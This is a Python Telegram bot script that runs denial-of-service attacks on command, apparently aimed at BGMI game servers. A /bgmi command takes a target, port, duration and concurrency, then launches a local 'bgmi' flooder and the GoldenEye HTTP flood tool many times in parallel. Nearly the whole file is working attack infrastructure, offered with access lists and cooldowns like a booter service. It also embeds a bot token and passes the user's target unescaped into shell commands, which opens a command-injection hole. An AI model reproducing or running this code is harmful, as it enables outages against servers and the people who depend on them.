#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import threading
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed

# Insert your Telegram bot token here
bot = telebot.TeleBot('7333857515:AAGXZEMiDqiNIPuZaQfjRrJRpvjUr6-lgRE')

# Admin user IDs
admin_id = ["6197097362"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Path to the GoldenEye zip file and directory
GOLDENEYE_ZIP = 'GoldenEye.zip'
GOLDENEYE_DIR = 'GoldenEye'

# Maximum number of concurrent threads
MAX_CONCURRENT_THREADS = 10

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            users = file.read().splitlines()
            print(f"Allowed users: {users}")  # Debugging statement
            return users
    except FileNotFoundError as e:
        error_message = f"User file not found. No users are currently allowed. Error: {e}"
        print(error_message)
        return []
    except Exception as e:
        error_message = f"Error reading user file: {e}"
        print(error_message)
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time, method, concurrents, status):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(LOG_FILE, "a") as file:  # Open in "append" mode
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\nMethod: {method}\nConcurrents: {concurrents}\nStatus: {status}\nStart: {start_time}\n\n")
    except Exception as e:
        error_message = f"Error logging command: {e}"
        print(error_message)

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None, method=None, concurrents=None):
    try:
        log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
        if target:
            log_entry += f" | Target: {target}"
        if port:
            log_entry += f" | Port: {port}"
        if time:
            log_entry += f" | Time: {time}"
        if method:
            log_entry += f" | Method: {method}"
        if concurrents:
            log_entry += f" | Concurrents: {concurrents}"
        
        with open(LOG_FILE, "a") as file:
            file.write(log_entry + "\n")
    except Exception as e:
        error_message = f"Error recording command logs: {e}"
        print(error_message)

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time, method, concurrents):
    try:
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        
        response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nMethod: {method}\nConcurrents: {concurrents}"
        bot.reply_to(message, response)
    except Exception as e:
        error_message = f"Error in start_attack_reply: {e}"
        print(error_message)
        bot.reply_to(message, f"An error occurred while starting the attack. Error: {e}")

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 300  # Default 5 minutes

# Function to extract GoldenEye zip file
def extract_goldeneye():
    try:
        if not os.path.exists(GOLDENEYE_DIR):
            with zipfile.ZipFile(GOLDENEYE_ZIP, 'r') as zip_ref:
                zip_ref.extractall(GOLDENEYE_DIR)
            print(f"GoldenEye extracted to {GOLDENEYE_DIR}")
    except Exception as e:
        print(f"Error extracting GoldenEye: {e}")
        return False
    return True

# Function to execute the attack in a separate thread
def execute_attack(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        result.check_returncode()
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error executing attack: {e.output}"
    except Exception as e:
        return f"Unexpected error: {e}"

# Function to execute multiple DDoS tools concurrently using a thread pool
def execute_multiple_attacks(commands, concurrents):
    try:
        with ThreadPoolExecutor(max_workers=MAX_CONCURRENT_THREADS) as executor:
            futures = [executor.submit(execute_attack, command) for command in commands for _ in range(concurrents)]
            for future in as_completed(futures):
                result = future.result()
                print(result)
    except Exception as e:
        error_message = f"Error executing multiple attacks: {e}"
        print(error_message)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    try:
        user_id = str(message.chat.id)
        print(f"User ID: {user_id}")  # Debugging statement
        if user_id in allowed_user_ids:
            if user_id not in admin_id:
                if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                    response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
                    bot.reply_to(message, response)
                    return
                bgmi_cooldown[user_id] = datetime.datetime.now()
            
            command = message.text.split()
            if len(command) == 6:  # Updated to accept target, port, time, method, and concurrents
                target = command[1]
                try:
                    port = int(command[2])
                    time = int(command[3])
                    method = command[4]
                    concurrents = int(command[5])
                except ValueError as e:
                    error_message = f"Error: Port, time, and concurrents must be integers. Error: {e}"
                    print(error_message)
                    bot.reply_to(message, error_message)
                    return

                if time > 5000:
                    response = "Error: Time interval must be less than 5000."
                elif concurrents > 300:
                    response = "Error: Concurrents must be 300 or less."
                else:
                    record_command_logs(user_id, '/bgmi', target, port, time, method, concurrents)
                    log_command(user_id, target, port, time, method, concurrents, "Started")
                    start_attack_reply(message, target, port, time, method, concurrents)

                    # Extract GoldenEye if not already extracted
                    if not extract_goldeneye():
                        bot.reply_to(message, "Failed to extract GoldenEye tool.")
                        return

                    # Define commands for both bgmi and an additional DDoS tool (GoldenEye)
                    bgmi_command = f"./bgmi {target} {port} {time} 500"
                    goldeneye_command = f"python3 {os.path.join(GOLDENEYE_DIR, 'goldeneye.py')} http://{target}:{port} -w {concurrents}"
                    
                    execute_multiple_attacks([bgmi_command, goldeneye_command], concurrents)
                    
                    response = f"BGMI and GoldenEye Attack Finished. Target: {target} Port: {port} Time: {time} Method: {method} Concurrents: {concurrents}"
                    log_command(user_id, target, port, time, method, concurrents, "Finished")
            else:
                response = "Usage: /bgmi <target> <port> <time> <method> <concurrents>"
        else:
            response = "You Are Not Authorized To Use This Command."

        bot.reply_to(message, response)
    except Exception as e:
        error_message = f"An error occurred: {e}"
        print(error_message)
        bot.reply_to(message, error_message)

bot.polling()
